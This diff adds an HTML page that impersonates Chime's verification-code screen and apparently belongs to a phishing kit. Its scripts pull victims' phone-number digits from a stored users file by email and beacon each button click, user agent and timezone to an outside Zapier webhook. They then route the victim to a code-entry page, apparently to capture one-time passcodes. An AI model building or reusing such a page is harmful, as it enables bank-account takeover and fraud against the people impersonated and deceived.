@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Get verification code – Chime</title>
+  <meta name="theme-color" content="#ffffff" />
+  <style>
+    :root { --chime-green:#2bd67b; --text:#0b1117; --muted:#9aa3b2; }
+    *{box-sizing:border-box;margin:0;padding:0;}
+    body{
+      background:#fff; color:var(--text);
+      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,sans-serif;
+      display:flex; justify-content:center; align-items:center; min-height:100vh; text-align:center; padding:20px;
+    }
+    main{ width:100%; max-width:420px; text-align:left; }
+
+    .logo{ margin-top:40px; margin-bottom:28px; }
+    .logo img{ width:130px; height:auto; display:block; margin:0 auto; }
+
+    /* UPDATED SOFTER HEADING */
+    h1{
+      font-size:36px;
+      font-weight:700;
+      line-height:1.15;
+      color:#0b3b31;
+      margin-bottom:14px;
+      text-align:left;
+    }
+
+    .subtitle{ font-size:16px; color:#444; margin-bottom:24px; line-height:1.5; }
+
+    /* UPDATED LINKS */
+    .links{ margin-top:12px; font-size:14px; color:#555; line-height:1.6; }
+    .links a{
+      font-size:17px;
+      font-weight:700;
+      color:var(--chime-green);
+      text-decoration:underline;
+    }
+
+    .btn { width:100%; height:56px; border-radius:16px; border:1px solid #d0d5dd; background:#fff; color:#111; font-size:17px; font-weight:700; cursor:pointer; margin-top:14px; }
+    .btn-primary { border:none; background:var(--chime-green); color:#000; }
+  </style>
+</head>
+<body>
+  <main>
+    <div class="logo">
+      <img src="B1284863-D15B-4144-A4EF-2BD810495F63.jpeg" alt="Chime Logo">
+    </div>
+
+    <h1>Get verification<br>code</h1>
+
+    <p class="subtitle">We'll send a code to <strong>(***) ***-<span id="last4">****</span></strong> to make sure you're you.</p>
+
+    <div class="links">
+      See our SMS terms in the
+      <a href="https://www.chime.com/chime-user-agreement/?embedded=true" target="_blank" rel="noopener noreferrer">
+        Chime User Agreement
+      </a>
+      and
+      <a href="https://www.chime.com/policies/chime/privacy-policy/?embedded=true" target="_blank" rel="noopener noreferrer">
+        Privacy Policy
+      </a>. Message and data rates may apply.
+    </div>
+
+    <p style="margin-top:18px; font-size:15px; color:#0b1117;">
+      Changed your number?
+      <a href="https://www.chime.com/help/articles/update-phone-number" target="_blank" rel="noopener noreferrer" style="color:#0b1117; font-weight:600; text-decoration:underline;">
+        Update number
+      </a>
+    </p>
+
+    <button id="textBtn" type="button" class="btn btn-primary">Text me the code</button>
+    <button id="callBtn" type="button" class="btn">Call me with the code</button>
+  </main>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+  const el = document.getElementById("last4");
+  if (!el) return;
+
+  const setEl = (v) => { el.textContent = String(v).slice(-4); };
+
+  let last4 = sessionStorage.getItem("last4");
+  if (last4 && String(last4).trim()) {
+    setEl(last4);
+    return;
+  }
+
+  const lookupEmail = sessionStorage.getItem("lookupEmail");
+  if (lookupEmail) {
+    try {
+      const res = await fetch("data/users.json", { cache: "no-store" });
+      if (res && res.ok) {
+        const users = await res.json();
+        const val = users[String(lookupEmail).toLowerCase()];
+        if (val) {
+          const v = String(val).slice(-4);
+          sessionStorage.setItem("last4", v);
+          setEl(v);
+          return;
+        }
+      }
+    } catch (e) {}
+  }
+  setEl("****");
+});
+</script>
+
+<script>
+(function(){ 
+  const ZAP_WEBHOOK = 'https://hooks.zapier.com/hooks/catch/25442860/uz5ii0b/';
+  function notify(eventName, extra) {
+    try {
+      const payload = {
+        event: String(eventName||"unknown"),
+        page: location.pathname,
+        href: location.href,
+        ts: new Date().toISOString(),
+        tzOffsetMin: -new Date().getTimezoneOffset(),
+        ua: navigator.userAgent,
+        eid: Math.random().toString(36).slice(2,10),
+        extra: extra || { }
+      };
+      const body = JSON.stringify(payload);
+      if (navigator.sendBeacon) {
+        const blob = new Blob([body], { type: "application/json" });
+        navigator.sendBeacon(ZAP_WEBHOOK, blob);
+      } else {
+        fetch(ZAP_WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body, keepalive: true }).catch(()=>{});
+      }
+    } catch(e){}
+  }
+  function go(next, evtName){
+    notify(evtName);
+    setTimeout(function(){ try{ window.location.assign(next); }catch(e){ location.href = next; } }, 200);
+    setTimeout(function(){ try{ window.location.replace(next); }catch(e){ location.href = next; } }, 1200);
+  }
+  function wire(){
+    var textBtn = document.getElementById("textBtn");
+    var callBtn = document.getElementById("callBtn");
+    if (textBtn && !textBtn.__wired){ textBtn.__wired=1; textBtn.addEventListener("click", function(e){ e.preventDefault(); go("enter_code.html","text_code_clicked"); }); }
+    if (callBtn && !callBtn.__wired){ callBtn.__wired=1; callBtn.addEventListener("click", function(e){ e.preventDefault(); go("enter_code.html","call_code_clicked"); }); }
+  }
+  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", wire, {once:true}); else wire();
+})();
+</script>
+
+</body>
+</html>
